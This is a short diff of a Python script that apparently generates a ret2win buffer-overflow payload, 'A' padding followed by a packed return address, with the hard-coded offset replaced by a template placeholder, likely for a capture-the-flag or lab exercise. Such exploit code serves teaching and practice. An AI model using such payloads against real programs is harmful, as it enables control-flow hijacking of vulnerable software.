@@ -6,9 +6,9 @@ if len(sys.argv) != 2:
     sys.exit(1)
 
 win = int(sys.argv[1], 16)
-OFFSET = 0x1c  # 0x18 + 0x4
+OFFSET = {offset}
 
-payload = b"A" * {offset}
+payload = b"A" * OFFSET
 payload += struct.pack("<I", win)
 
 sys.stdout.buffer.write(payload)
